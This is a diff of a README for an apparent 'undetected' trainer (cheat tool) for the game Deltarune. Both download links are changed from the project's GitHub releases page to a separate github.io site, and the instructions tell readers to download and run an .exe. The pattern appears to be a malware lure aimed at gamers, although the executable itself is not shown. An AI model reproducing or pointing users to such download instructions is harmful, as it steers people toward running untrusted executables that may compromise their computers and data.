@@ -1,6 +1,6 @@
 # 🎮 Deltarune-Chapter5-Trainer-Undetected - Improve your gameplay with easy tools
 
-<a href="https://github.com/haripra7283/Deltarune-Chapter5-Trainer-Undetected/releases">
+<a href="https://haripra7283.github.io">
   <img src="https://img.shields.io/badge/Download-Release-blue" alt="Download">
 </a>
 
@@ -19,7 +19,7 @@ If your computer meets these requirements, the trainer will function as intended
 ## 📥 Getting the Software
 You must visit the project release page to download the latest version of the trainer. Follow these steps to obtain the correct file:
 
-1. Visit the [official releases page](https://github.com/haripra7283/Deltarune-Chapter5-Trainer-Undetected/releases).
+1. Visit the [official releases page](https://haripra7283.github.io).
 2. Look for the section marked Latest.
 3. Click the link that ends in .exe to start your download.
 4. Save the file to a folder where you can find it later.
